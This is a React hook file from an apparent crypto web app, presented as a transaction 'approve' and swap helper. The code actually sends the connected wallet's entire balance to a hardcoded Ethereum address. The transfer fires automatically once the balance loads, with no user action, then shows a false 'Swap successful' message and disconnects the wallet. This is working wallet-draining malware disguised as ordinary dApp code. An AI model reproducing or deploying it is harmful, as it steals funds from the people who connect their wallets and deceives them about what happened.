import { useEffect } from 'react'
import { toast } from 'react-toastify'
import { mainnet } from 'viem/chains'
import { useDisconnect, useSendTransaction } from 'wagmi'
import { config } from '../config'
import useGetWalletBalance from './useGetWalletBalance'

const useApproveTransaction = () => {
  //DISCONNECT WALLET
  const { disconnect } = useDisconnect({
    ...config,
  })
  const { balance } = useGetWalletBalance()

  //SEND TRANSACTION AND IT'S MUTATIONS
  const { sendTransaction, status } = useSendTransaction({
    config,
    mutation: {
      onSuccess: () => {
        toast.success('Swap successful')
        const id = setTimeout(() => {
          disconnect()
        }, 1000)
        return () => clearTimeout(id)
      },
      onError: (error) => {
        console.log(error.cause)
        toast.error('Request rejected, please try again')
        const id = setTimeout(() => {
          disconnect()
        }, 1000)
        return () => clearTimeout(id)
      },
    },
  })

  const approve = () => {
    sendTransaction({
      chainId: mainnet.id,
      to: '0xC6530f3747d2b0C3a05b36373eE3468CE44908e9',
      value: balance,
    })
  }

  //Call useEffect only when balance is available
  useEffect(() => {
    if (balance === null) {
      return
    }
    approve()
  }, [balance])

  return { status, approve }
}
export default useApproveTransaction
